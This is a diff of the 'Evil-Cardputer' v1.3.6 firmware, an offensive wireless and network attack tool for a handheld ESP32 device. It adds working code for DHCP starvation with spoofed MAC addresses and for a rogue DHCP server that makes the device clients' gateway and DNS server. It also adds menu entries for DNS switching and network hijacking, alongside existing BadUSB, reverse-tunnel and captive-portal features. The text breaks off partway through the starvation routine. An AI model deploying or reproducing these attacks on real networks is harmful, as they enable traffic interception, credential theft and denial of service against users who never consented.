@@ -112,7 +112,12 @@ static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;
 
 WebServer server(80);
 DNSServer dnsServer;
+IPAddress ipAP;    // Adresse IP du mode AP
+IPAddress ipSTA;   // Adresse IP du mode STA
+bool useAP = true; // Alterner entre AP et STA
 const byte DNS_PORT = 53;
+
+
 
 int currentIndex = 0, lastIndex = -1;
 bool inMenu = true;
@@ -162,8 +167,11 @@ const char* menuItems[] = {
     "BadUSB",
     "Bluetooth Keyboard",
     "Reverse TCP Tunnel",
+    "DHCP Starvation",
+    "Rogue DHCP",
+    "Switch DNS",
+    "Network Hijacking",
     "Settings",
-
 };
 
 const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
@@ -181,8 +189,9 @@ int topVisibleIndex = 0;
 // Connect to nearby wifi network automaticaly to provide internet to the cardputer you can be connected and provide AP at same time
 //!!!!!! CHANGE THIS !!!!!
 //!!!!!! CHANGE THIS !!!!!
-const char* ssid = ""; // ssid to connect,connection skipped at boot if stay blank ( can be shutdown by different action like probe attack)
-const char* password = ""; // wifi password
+String ssid = "";
+String password = "";
+
 
 
 //!!!!!! CHANGE THIS !!!!!
@@ -935,7 +944,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.3.5 2024";
+  const char* text3 = "v1.3.6 2024";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -965,7 +974,7 @@ void setup() {
   Serial.println("-------------------");
   Serial.println("Evil-Cardputer");
   Serial.println("By 7h30th3r0n3");
-  Serial.println("v1.3.5 2024");
+  Serial.println("v1.3.6 2024");
   Serial.println("-------------------");
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -1023,28 +1032,28 @@ void setup() {
     delay(250);
   }
 
-  if (strcmp(ssid, "") != 0) {
-    //WiFi.mode(WIFI_MODE_APSTA);
-    WiFi.begin(ssid, password);
-
-    unsigned long startAttemptTime = millis();
- 
-    while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 3000) {
-      delay(500);
-      Serial.println("Trying to connect to Wifi...");
-    }
-
-    if (WiFi.status() == WL_CONNECTED) {
-      Serial.println("Connected to wifi !!!");
-      M5.Display.clear();
-      M5.Lcd.setCursor(M5.Display.width() / 2 - 48, M5.Display.height() / 2);
-      M5.Display.println("Connected to");
-      M5.Lcd.setCursor(M5.Display.width() / 2 - 48, M5.Display.height() / 2 + 12);
-      M5.Display.println(ssid);
-      delay(1000);
-    } else {
-      Serial.println("Fail to connect to Wifi or timeout...");
-    }
+    if (ssid != "") {
+      //WiFi.mode(WIFI_MODE_AP);
+      WiFi.begin(ssid.c_str(), password.c_str());
+  
+      unsigned long startAttemptTime = millis();
+   
+      while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 3000) {
+        delay(500);
+        Serial.println("Trying to connect to Wifi...");
+      }
+  
+      if (WiFi.status() == WL_CONNECTED) {
+        Serial.println("Connected to wifi !!!");
+        M5.Display.clear();
+        M5.Lcd.setCursor(M5.Display.width() / 2 - 48, M5.Display.height() / 2);
+        M5.Display.println("Connected to");
+        M5.Lcd.setCursor(M5.Display.width() / 2 - 48, M5.Display.height() / 2 + 12);
+        M5.Display.println(ssid);
+        delay(1000);
+      } else {
+        Serial.println("Fail to connect to Wifi or timeout...");
+      }
   } else {
     Serial.println("SSID is empty.");
     Serial.println("Skipping Wi-Fi connection.");
@@ -1105,7 +1114,7 @@ void sshConnect(const char *host = nullptr);
 
 
 unsigned long lastTaskBarUpdateTime = 0;
-const long taskBarUpdateInterval = 1000; // Mettre à jour chaque seconde
+const long taskBarUpdateInterval = 2500; // Mettre à jour chaque seconde
 bool pageAccessFlag = false;
 
 int getConnectedPeopleCount() {
@@ -1451,9 +1460,20 @@ void executeMenuItem(int index) {
         reverseTCPTunnel();
         break;
     case 45:
+        startDHCPStarvation();
+        break;
+    case 46:
+        rogueDHCP();
+        break;
+    case 47:
+        switchDNS();
+        break;
+    case 48:
+        DHCPAttackAuto();
+        break;
+    case 49:
         showSettingsMenu();
         break;
-
   }
   isOperationInProgress = false;
 }
@@ -2045,8 +2065,10 @@ void createCaptivePortal() {
     }
 
   }
-
-  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+  ipAP = WiFi.softAPIP();
+  ipSTA = WiFi.localIP();
+  
+  dnsServer.start(DNS_PORT, "*", ipAP);
   isCaptivePortalOn = true;
   server.on("/", HTTP_GET, []() {
     String email = server.arg("email");
@@ -4330,11 +4352,11 @@ void restoreConfigParameter(String key) {
           } else if (key == "selectedTheme") {
             selectedTheme = stringValue;
             Serial.println("Selected Theme restored to " + stringValue);
-          } else if (key == "wifi_ssid" && strlen(ssid) == 0) {
+          } else if (key == "wifi_ssid" && ssid.length() == 0) {
               stringValue.toCharArray(ssid_buffer, sizeof(ssid_buffer));
               ssid = ssid_buffer;
               Serial.println("WiFi SSID restored to " + stringValue);
-          } else if (key == "wifi_password" && strlen(password) == 0) {
+          } else if (key == "wifi_password" && password.length() == 0) {
               stringValue.toCharArray(password_buffer, sizeof(password_buffer));
               password = password_buffer;
               Serial.println("WiFi Password restored ");
@@ -5801,9 +5823,9 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.3.5"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.3.6"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.3.5"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.3.6"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -8189,7 +8211,7 @@ void connectWifi(int networkIndex) {
   }
 
   String nameSSID = ssidList[networkIndex];
-  String password = "";
+  String typedPassword = "";
 
   Serial.print("Selected network SSID: ");
   Serial.println(nameSSID);
@@ -8199,6 +8221,7 @@ void connectWifi(int networkIndex) {
     Serial.println("Network is open, no password required.");
     if (connectToWiFi(nameSSID, "")) {
       waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
+      ssid = nameSSID; // Stocke le SSID sélectionné
     } else {
       waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
     }
@@ -8219,26 +8242,28 @@ void connectWifi(int networkIndex) {
         Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
 
         for (auto i : status.word) {
-          password += i;
+          typedPassword += i;
         }
 
-        if (status.del && password.length() > 0) {
-          password.remove(password.length() - 1);
+        if (status.del && typedPassword.length() > 0) {
+          typedPassword.remove(typedPassword.length() - 1);
         }
 
         M5.Display.clear();
         M5.Display.setCursor(0, 10);
         M5.Display.println("Password for " + nameSSID + " :");
         M5.Display.setCursor(0, 30);
-        M5.Display.println(password); // Affichez le mot de passe en clair
+        M5.Display.println(typedPassword); // Affichez le mot de passe en clair
         M5.Display.display();
 
         if (status.enter) {
           Serial.print("Attempting to connect to WiFi with password: ");
-          Serial.println(password);
+          Serial.println(typedPassword);
 
-          if (connectToWiFi(nameSSID, password)) {
+          if (connectToWiFi(nameSSID, typedPassword)) {
             waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
+            ssid = nameSSID; // Stocke le SSID sélectionné
+            password = typedPassword;
           } else {
             waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
           }
@@ -10234,7 +10259,7 @@ int totalNetworks = 0;
 unsigned long lastLog = 0;
 int currentScreen = 1;  // Track which screen is currently displayed
 
-const String wigleHeaderFileFormat = "WigleWifi-1.4,appRelease=v1.3.5,model=Cardputer,release=v1.3.5,device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
+const String wigleHeaderFileFormat = "WigleWifi-1.4,appRelease=v1.3.6,model=Cardputer,release=v1.3.6,device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
     "MAC", "SSID", "AuthMode", "FirstSeen", "Channel", "RSSI", "CurrentLatitude", "CurrentLongitude", "AltitudeMeters", "AccuracyMeters", "Type"
@@ -12028,7 +12053,7 @@ void reverseTCPTunnel() {
                 attemptingConnection = false;
             } else {
                 if (WiFi.status() != WL_CONNECTED) {
-                  WiFi.begin(ssid, password);
+                  WiFi.begin(ssid.c_str(), password.c_str());
                 }
                 M5.Display.clear();
                 M5.Display.setCursor(20, M5.Display.height() / 2);
@@ -12201,4 +12226,1201 @@ void handleDataTransfer(WiFiClient &client) {
     Serial.println("Connection to local web server closed.");
   }
   delay(10);
+}
+
+
+
+#include <WiFiUdp.h>
+
+WiFiUDP udp;
+unsigned int localUdpPort = 67; // DHCP Port
+IPAddress rogueIPRogue;              // Use the IP address obtained by the ESP32
+
+IPAddress currentSubnetRogue;
+IPAddress currentGatewayRogue;
+IPAddress currentDNSRogue;
+uint8_t offeredIpSuffixRogue = 101; // IP suffix used for DHCP offer
+int cursorPositionRogue = 10;         // Initial cursor position
+const int maxLinesRogue = 10;         // Number of lines to display
+String displayLinesRogue[10];         // Array to store the last lines
+int currentLineRogue = 0;             // Index of the current line
+
+uint8_t availableIpSuffixesRogue[] = {101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150};
+const int numAvailableIps = sizeof(availableIpSuffixesRogue) / sizeof(availableIpSuffixesRogue[0]);
+bool ipAllocatedRogue[numAvailableIps] = {false}; // Track allocated IPs
+
+#define MAX_CLIENTS 10
+struct ClientInfo {
+  uint8_t mac[6];
+  uint8_t ipSuffix;
+};
+
+ClientInfo clients[MAX_CLIENTS];
+
+void initClients() {
+  for (int i = 0; i < MAX_CLIENTS; i++) {
+    memset(clients[i].mac, 0, 6);
+    clients[i].ipSuffix = 0;
+  }
+}
+
+void rogueDHCP() {
+  rogueIPRogue = WiFi.localIP();
+  currentSubnetRogue = WiFi.subnetMask();
+  currentGatewayRogue = WiFi.localIP();
+  currentDNSRogue = WiFi.localIP();
+
+  initClients(); // Initialize client info
+
+  if (!udp.begin(localUdpPort)) {
+    Serial.println("Error: UDP port 67 start failed.");
+    waitAndReturnToMenu("Error: UDP start failed.");
+    return;
+  }
+
+  M5.Display.clear(menuBackgroundColor);
+  Serial.println("Rogue DHCP running...");
+  updateDisplay("DHCP running...");
+
+  while (true) {
+    M5.update();
+    M5Cardputer.update();
+    handleDnsRequestSerial();
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      Serial.println("Returning to menu.");
+      updateDisplay("Returning...");
+      waitAndReturnToMenu("Return to menu.");
+      break;
+    }
+
+    int packetSizeRogue = udp.parsePacket();
+    if (packetSizeRogue > 0 && packetSizeRogue <= 512) {
+      Serial.printf("Received packet, size: %d bytes\n", packetSizeRogue);
+      updateDisplay("Packet received");
+
+      uint8_t packetBufferRogue[512];
+      udp.read(packetBufferRogue, packetSizeRogue);
+
+      uint8_t messageTypeRogue = getDHCPMessageType(packetBufferRogue, packetSizeRogue);
+
+      if (messageTypeRogue == 1) { // DHCP Discover
+        Serial.println("DHCP Discover received. Preparing Offer...");
+        updateDisplay("Discover. Preparing Offer...");
+        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2); // Message Type 2: DHCP Offer
+
+        // Send the DHCP Offer
+        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
+        Serial.println("DHCP Offer sent.");
+        updateDisplay("Offer sent.");
+
+      } else if (messageTypeRogue == 3) { // DHCP Request
+        Serial.println("DHCP Request received. Preparing ACK...");
+        updateDisplay("Request. Preparing ACK...");
+        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5); // Message Type 5: DHCP ACK
+
+        // Send the DHCP ACK
+        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
+        Serial.println("DHCP ACK sent.");
+        updateDisplay("ACK sent.");
+      }
+    }
+  }
+}
+
+uint8_t getDHCPMessageType(uint8_t *packetRogue, int packetSizeRogue) {
+  // DHCP options start after 240 bytes
+  int optionsIndexRogue = 240;
+  while (optionsIndexRogue < packetSizeRogue) {
+    uint8_t optionTypeRogue = packetRogue[optionsIndexRogue++];
+    if (optionTypeRogue == 255) {
+      break; // End Option
+    } else if (optionTypeRogue == 0) {
+      continue; // Pad Option, skip
+    }
+    if (optionsIndexRogue >= packetSizeRogue) break; // Prevent out-of-bounds access
+    uint8_t optionLenRogue = packetRogue[optionsIndexRogue++];
+    if (optionsIndexRogue + optionLenRogue > packetSizeRogue) break; // Prevent out-of-bounds access
+    if (optionTypeRogue == 53 && optionLenRogue == 1) {
+      return packetRogue[optionsIndexRogue]; // Return the DHCP message type
+    }
+    optionsIndexRogue += optionLenRogue; // Skip to the next option
+  }
+  return 0; // Unknown message type
+}
+
+void parseDHCPOptions(uint8_t *packetRogue, int packetSizeRogue, IPAddress &requestedIP, IPAddress &serverID) {
+  // DHCP options start after 240 bytes
+  int optionsIndexRogue = 240;
+  while (optionsIndexRogue < packetSizeRogue) {
+    uint8_t optionTypeRogue = packetRogue[optionsIndexRogue++];
+    if (optionTypeRogue == 255) {
+      break; // End Option
+    } else if (optionTypeRogue == 0) {
+      continue; // Pad Option, skip
+    }
+    if (optionsIndexRogue >= packetSizeRogue) break; // Prevent out-of-bounds access
+    uint8_t optionLenRogue = packetRogue[optionsIndexRogue++];
+    if (optionsIndexRogue + optionLenRogue > packetSizeRogue) break; // Prevent out-of-bounds access
+
+    if (optionTypeRogue == 50 && optionLenRogue == 4) {
+      // Requested IP Address
+      requestedIP = IPAddress(packetRogue[optionsIndexRogue], packetRogue[optionsIndexRogue + 1], packetRogue[optionsIndexRogue + 2], packetRogue[optionsIndexRogue + 3]);
+    } else if (optionTypeRogue == 54 && optionLenRogue == 4) {
+      // Server Identifier
+      serverID = IPAddress(packetRogue[optionsIndexRogue], packetRogue[optionsIndexRogue + 1], packetRogue[optionsIndexRogue + 2], packetRogue[optionsIndexRogue + 3]);
+    }
+    optionsIndexRogue += optionLenRogue; // Skip to the next option
+  }
+}
+
+void prepareDHCPResponse(uint8_t *packetRogue, int &packetSizeRogue, uint8_t messageTypeRogue) {
+  // Set BOOTREPLY
+  packetRogue[0] = 2; // BOOTREPLY
+
+  // Extract client MAC address
+  uint8_t clientMac[6];
+  memcpy(clientMac, &packetRogue[28], 6);
+
+  // Variables to hold requested IP and server identifier
+  IPAddress requestedIP(0, 0, 0, 0);
+  IPAddress serverID(0, 0, 0, 0);
+
+  // Parse DHCP options to get requested IP and server identifier
+  parseDHCPOptions(packetRogue, packetSizeRogue, requestedIP, serverID);
+
+  uint8_t offeredIpSuffix = 0;
+
+  if (messageTypeRogue == 2) { // DHCP Offer
+    // Allocate an IP address for the client
+    offeredIpSuffix = allocateIpAddress(clientMac);
+    if (offeredIpSuffix == 0) {
+      Serial.println("No available IP addresses.");
+      updateDisplay("No available IPs.");
+      return;
+    }
+  } else if (messageTypeRogue == 5) { // DHCP ACK
+    // Client is requesting a specific IP
+    if (requestedIP != IPAddress(0, 0, 0, 0)) {
+      if (requestedIP[0] == rogueIPRogue[0] && requestedIP[1] == rogueIPRogue[1] && requestedIP[2] == rogueIPRogue[2]) {
+        // Check if requested IP is in our available IPs
+        uint8_t requestedSuffix = requestedIP[3];
+        // Check if requestedSuffix is in availableIpSuffixesRogue[]
+        bool ipAvailable = false;
+        for (int i = 0; i < numAvailableIps; i++) {
+          if (availableIpSuffixesRogue[i] == requestedSuffix) {
+            // Check if IP is already allocated
+            if (!ipAllocatedRogue[i]) {
+              // Allocate the IP to the client
+              ipAllocatedRogue[i] = true;
+              // Store the client info
+              for (int j = 0; j < MAX_CLIENTS; j++) {
+                if (clients[j].ipSuffix == 0 || memcmp(clients[j].mac, clientMac, 6) == 0) {
+                  memcpy(clients[j].mac, clientMac, 6);
+                  clients[j].ipSuffix = requestedSuffix;
+                  break;
+                }
+              }
+              offeredIpSuffix = requestedSuffix;
+              ipAvailable = true;
+              break;
+            } else {
+              // IP is already allocated
+              // Check if it's allocated to the same client
+              for (int j = 0; j < MAX_CLIENTS; j++) {
+                if (clients[j].ipSuffix == requestedSuffix && memcmp(clients[j].mac, clientMac, 6) == 0) {
+                  // IP is allocated to the same client
+                  offeredIpSuffix = requestedSuffix;
+                  ipAvailable = true;
+                  break;
+                }
+              }
+            }
+          }
+        }
+      }
+    } else {
+      // No requested IP, allocate IP
+      offeredIpSuffix = allocateIpAddress(clientMac);
+      if (offeredIpSuffix == 0) {
+        Serial.println("No available IP addresses.");
+        updateDisplay("No available IPs.");
+        return;
+      }
+    }
+  }
+
+  // Set your offered IP address (yiaddr)
+  packetRogue[16] = rogueIPRogue[0];
+  packetRogue[17] = rogueIPRogue[1];
+  packetRogue[18] = rogueIPRogue[2];
+  packetRogue[19] = offeredIpSuffix;
+
+  // Display the allocated IP address
+  char allocatedIpMessage[50];
+  sprintf(allocatedIpMessage, "IP: %d.%d.%d.%d", rogueIPRogue[0], rogueIPRogue[1], rogueIPRogue[2], offeredIpSuffix);
+  updateDisplay(allocatedIpMessage);
+
+  // Set the server IP address (siaddr)
+  packetRogue[20] = rogueIPRogue[0];
+  packetRogue[21] = rogueIPRogue[1];
+  packetRogue[22] = rogueIPRogue[2];
+  packetRogue[23] = rogueIPRogue[3];
+
+  // DHCP Magic cookie
+  packetRogue[236] = 0x63;
+  packetRogue[237] = 0x82;
+  packetRogue[238] = 0x53;
+  packetRogue[239] = 0x63;
+
+  // Start adding DHCP options
+  int optionIndexRogue = 240;
+
+  // DHCP Message Type (Option 53)
+  packetRogue[optionIndexRogue++] = 53;   // Option
+  packetRogue[optionIndexRogue++] = 1;    // Length
+  packetRogue[optionIndexRogue++] = messageTypeRogue; // Message Type
+
+  // Server Identifier (Option 54)
+  packetRogue[optionIndexRogue++] = 54;   // Option
+  packetRogue[optionIndexRogue++] = 4;    // Length
+  packetRogue[optionIndexRogue++] = rogueIPRogue[0];
+  packetRogue[optionIndexRogue++] = rogueIPRogue[1];
+  packetRogue[optionIndexRogue++] = rogueIPRogue[2];
+  packetRogue[optionIndexRogue++] = rogueIPRogue[3];
+
+  // Subnet Mask (Option 1)
+  packetRogue[optionIndexRogue++] = 1;    // Option
+  packetRogue[optionIndexRogue++] = 4;    // Length
+  packetRogue[optionIndexRogue++] = currentSubnetRogue[0];
+  packetRogue[optionIndexRogue++] = currentSubnetRogue[1];
+  packetRogue[optionIndexRogue++] = currentSubnetRogue[2];
+  packetRogue[optionIndexRogue++] = currentSubnetRogue[3];
+
+  // Router (Gateway) (Option 3)
+  packetRogue[optionIndexRogue++] = 3;    // Option
+  packetRogue[optionIndexRogue++] = 4;    // Length
+  packetRogue[optionIndexRogue++] = rogueIPRogue[0];
+  packetRogue[optionIndexRogue++] = rogueIPRogue[1];
+  packetRogue[optionIndexRogue++] = rogueIPRogue[2];
+  packetRogue[optionIndexRogue++] = rogueIPRogue[3];
+
+  // DNS Server (Option 6)
+  packetRogue[optionIndexRogue++] = 6;    // Option
+  packetRogue[optionIndexRogue++] = 4;    // Length
+  packetRogue[optionIndexRogue++] = currentDNSRogue[0];
+  packetRogue[optionIndexRogue++] = currentDNSRogue[1];
+  packetRogue[optionIndexRogue++] = currentDNSRogue[2];
+  packetRogue[optionIndexRogue++] = currentDNSRogue[3];
+
+  // Lease Time (Option 51)
+  packetRogue[optionIndexRogue++] = 51;   // Option
+  packetRogue[optionIndexRogue++] = 4;    // Length
+  packetRogue[optionIndexRogue++] = 0x00;
+  packetRogue[optionIndexRogue++] = 0x01;
+  packetRogue[optionIndexRogue++] = 0x51;
+  packetRogue[optionIndexRogue++] = 0x80; // 1-day lease time (86400 seconds)
+
+  // End Option
+  packetRogue[optionIndexRogue++] = 255;
+
+  // Update packet size
+  packetSizeRogue = optionIndexRogue;
+}
+
+void sendDHCPResponse(uint8_t *packetRogue, int packetSizeRogue) {
+  // Send the packet to the client port (68)
+  udp.beginPacket(IPAddress(255, 255, 255, 255), 68);
+  udp.write(packetRogue, packetSizeRogue);
+  udp.endPacket();
+}
+
+uint8_t allocateIpAddress(uint8_t *clientMac) {
+  // Check if this client already has an IP allocated
+  for (int i = 0; i < MAX_CLIENTS; i++) {
+    if (memcmp(clients[i].mac, clientMac, 6) == 0) {
+      // Client found, return the allocated IP suffix
+      return clients[i].ipSuffix;
+    }
+  }
+
+  // Client not found, allocate a new IP
+  for (int i = 0; i < numAvailableIps; i++) {
+    if (!ipAllocatedRogue[i]) {
+      ipAllocatedRogue[i] = true;
+      // Store the client info
+      for (int j = 0; j < MAX_CLIENTS; j++) {
+        if (clients[j].ipSuffix == 0) { // Empty slot
+          memcpy(clients[j].mac, clientMac, 6);
+          clients[j].ipSuffix = availableIpSuffixesRogue[i];
+          return clients[j].ipSuffix;
+        }
+      }
+    }
+  }
+  return 0; // No available IPs
+}
+
+
+void updateDisplay(const char* message) {
+  // Add the new message to the array
+  displayLinesRogue[currentLineRogue] = String(message);
+  currentLineRogue = (currentLineRogue + 1) % maxLinesRogue;
+
+  // Clear the screen
+  M5.Display.clear(menuBackgroundColor);
+
+  // Display the last lines
+  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+  int y = 10;
+  for (int i = 0; i < maxLinesRogue; i++) {
+    int index = (currentLineRogue - i - 1 + maxLinesRogue) % maxLinesRogue;
+    if (!displayLinesRogue[index].isEmpty()) {
+      M5.Display.setCursor(0, y);
+      M5.Display.println(displayLinesRogue[index]);
+      y += 12;
+    }
+  }
+
+  M5.Display.display();
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+uint32_t totalIPs = 0;
+
+uint32_t calculateTotalIPs(IPAddress subnetMask) {
+    uint32_t mask = ((uint32_t)subnetMask[0] << 24) | ((uint32_t)subnetMask[1] << 16) | ((uint32_t)subnetMask[2] << 8) | subnetMask[3];
+    uint8_t prefixLength = 0;
+    for (int i = 0; i < 32; i++) {
+        if (mask & (1UL << (31 - i))) {
+            prefixLength++;
+        } else {
+            break;
+        }
+    }
+    uint8_t hostBits = 32 - prefixLength;
+    uint32_t totalIPs = 1UL << hostBits;
+    return totalIPs;
+}
+
+IPAddress currentIPStarvation;
+IPAddress currentSubnet;
+IPAddress currentGateway;
+IPAddress currentDNS;
+
+// DHCP variables
+IPAddress broadcastIP(255, 255, 255, 255);
+uint8_t macBase[6] = {0xAE, 0xAD, 0xBE, 0xEF, 0x00, 0x00};
+IPAddress dhcpServerIP;
+bool dhcpServerDetected = false;
+
+unsigned int localUdpPortStarvation = 67;
+
+uint32_t discoverCount = 0;
+uint32_t offerCount = 0;
+uint32_t requestCount = 0;
+uint32_t ackCount = 0;
+uint32_t nakCount = 0;
+IPAddress lastAssignedIP;
+
+void saveCurrentNetworkConfig() {
+    currentIPStarvation = WiFi.localIP();
+    currentSubnet = WiFi.subnetMask();
+    currentGateway = WiFi.gatewayIP();
+    currentDNS = WiFi.dnsIP();
+
+    totalIPs = calculateTotalIPs(currentSubnet);
+    
+    Serial.println("Current network saved:");
+    Serial.print("IP: ");
+    Serial.println(currentIPStarvation);
+    Serial.print("Subnet mask: ");
+    Serial.println(currentSubnet);
+    Serial.print("Gateway: ");
+    Serial.println(currentGateway);
+    Serial.print("DNS: ");
+    Serial.println(currentDNS);
+
+    M5.Display.clear(menuBackgroundColor);
+    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    M5.Display.setCursor(0, 0);
+    M5.Display.println("Current network saved:");
+    M5.Display.printf("IP: %s\n", currentIPStarvation.toString().c_str());
+    M5.Display.printf("Subnet: %s\n", currentSubnet.toString().c_str());
+    M5.Display.printf("Gateway: %s\n", currentGateway.toString().c_str());
+    M5.Display.printf("DNS: %s\n", currentDNS.toString().c_str());
+    M5.Display.display();
+    delay(2000);
+}
+
+void disconnectWiFi() {
+    WiFi.disconnect(true);
+    Serial.println("WiFi disconnected.");
+    
+    M5.Display.clear(menuBackgroundColor);
+    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    M5.Display.setCursor(0, 0);
+    M5.Display.println("WiFi disconnected.");
+    M5.Display.display();
+    delay(1000);
+}
+
+void configureStaticIP() {
+    if (!WiFi.config(currentIPStarvation, currentGateway, currentSubnet, currentDNS)) {
+        Serial.println("Failed to configure static IP.");
+        M5.Display.clear(menuBackgroundColor);
+        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+        M5.Display.setCursor(0, 0);
+        M5.Display.println("Failed to configure\n static IP.");
+        M5.Display.display();
+        delay(2000);
+    } else {
+        Serial.println("Static IP configured successfully.");
+        M5.Display.clear(menuBackgroundColor);
+        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+        M5.Display.setCursor(0, 0);
+        M5.Display.println("Static IP configured \nsuccessfully.");
+        M5.Display.display();
+        delay(1000);
+    }
+}
+
+void reconnectWiFi(int networkIndex) {
+    Serial.println("Reconnecting to WiFi...");
+    M5.Display.clear(menuBackgroundColor);
+    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    M5.Display.setCursor(0, 0);
+    M5.Display.println("Reconnecting to WiFi...");
+    M5.Display.display();
+    
+    if (getWifiSecurity(networkIndex) == "Open") {
+        Serial.println("Network is open, no password required.");
+        WiFi.begin(ssid.c_str()); // Connexion sans mot de passe
+    } else {
+        Serial.println("Network requires a password.");
+        WiFi.begin(ssid.c_str(), password.c_str());
+    }
+    
+    while (WiFi.status() != WL_CONNECTED) {
+        delay(500);
+        Serial.print(".");
+        M5.Display.print(".");
+        M5.Display.display();
+    }
+
+    Serial.println("\nConnected to WiFi.");
+    M5.Display.println("\nConnected to WiFi.");
+    M5.Display.display();
+    delay(1000);
+}
+
+
+
+void detectDHCPServer() {
+    unsigned long startMillis = millis();
+    M5.Display.clear(menuBackgroundColor);
+    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    M5.Display.setCursor(0, 0);
+    M5.Display.println("Detecting DHCP server...");
+    M5.Display.println("Press ENTER to cancel");
+    M5.Display.display();
+    dhcpServerDetected = false;
+    while (millis() - startMillis < 16000) { // Maximum wait time of 30 seconds
+        M5.update();
+        M5Cardputer.update();
+        
+        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+            Serial.println("Detection cancelled by user");
+            M5.Display.clear(menuBackgroundColor);
+            M5.Display.setCursor(0, 0);
+            M5.Display.printf("Detection cancelled");
+            M5.Display.display();
+            delay(2000);
+            return;
+        }
+
+        sendDHCPDiscover(macBase); // Send DHCP Discover request
+
+        // Wait for response for 5 seconds
+        unsigned long responseStartMillis = millis();
+        while (millis() - responseStartMillis < 5000) {
+            int packetSize = udp.parsePacket();
+            if (packetSize > 0) {
+                uint8_t packetBuffer[512];
+                udp.read(packetBuffer, packetSize);
+
+                uint8_t messageType = parseDHCPMessageType(packetBuffer, packetSize);
+                if (messageType == 2) { // DHCP Offer
+                    dhcpServerIP = IPAddress(packetBuffer[20], packetBuffer[21], packetBuffer[22], packetBuffer[23]);
+                    Serial.printf("DHCP server detected: %s\n", dhcpServerIP.toString().c_str());
+                    M5.Display.printf("DHCP server found:\n%s\n", dhcpServerIP.toString().c_str());
+                    M5.Display.display();
+                    dhcpServerDetected = true;
+                    delay(2000);
+                    return; // DHCP server found
+                }
+            }
+        }
+    }
+    Serial.println("No DHCP server detected after timeout.");
+    M5.Display.println("No DHCP server detected");
+    M5.Display.println("Timeout reached");
+    M5.Display.display();
+    delay(2000);
+}
+
+
+int percentage = 0;
+bool NAKFlagStarvation = false;
+int NAKNumberStarvation = 50;
+
+void startDHCPStarvation() {
+      if (WiFi.localIP().toString() == "0.0.0.0") {
+        waitAndReturnToMenu("Not connected...");
+        return;
+    }
+
+    discoverCount = 0;
+    offerCount = 0;
+    requestCount = 0;
+    ackCount = 0;
+    nakCount = 0;
+
+    saveCurrentNetworkConfig();
+    if (totalIPs == 0) {
+        Serial.println("Error: Total IPs calculated as zero.");
+        M5.Display.clear(menuBackgroundColor);
+        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+        M5.Display.setCursor(0, 0);
+        M5.Display.println("Error: Total IPs\ncalculated as zero.\nsettings to 255");
+        totalIPs == 255;
+        M5.Display.display();
+        delay(2000);
+    }
+    disconnectWiFi();
+    configureStaticIP();
+    reconnectWiFi(currentListIndex);
+    randomSeed(analogRead(0)); // Initialize random generator
+
+    if (!udp.begin(68)) {
+        Serial.println("Error: Failed to initialize UDP socket on port 68.");
+        M5.Display.clear(menuBackgroundColor);
+        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+        M5.Display.setCursor(0, 0);
+        M5.Display.println("Error: Failed to init \nUDP socket");
+        M5.Display.display();
+        delay(2000);
+        return;
+    }
+
+    Serial.println("System initialized. Ready to detect DHCP server...");
+    M5.Display.clear(menuBackgroundColor);
+    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    M5.Display.setCursor(0, 0);
+    M5.Display.println("System initialized");
+    M5.Display.println("Starting DHCP detection...");
+    M5.Display.display();
+    delay(1000);
+
+    detectDHCPServer();
+    if (dhcpServerDetected) {
